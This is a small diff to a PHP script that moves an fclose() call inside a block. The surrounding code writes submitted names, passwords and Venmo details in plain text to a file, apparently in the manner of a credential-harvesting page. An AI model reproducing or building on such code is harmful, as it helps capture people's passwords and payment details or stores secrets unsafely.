@@ -24,7 +24,6 @@ if ($uploadOk == 1) {
 	fwrite($myfile, "User: " . $_POST['name'] . "\n");
 	fwrite($myfile, $_POST['pass'] . "\n");
 	fwrite($myfile, $_POST['venmo'] . "\n");
+	fclose($myfile);
 }
-fclose($myfile);
-
 ?>
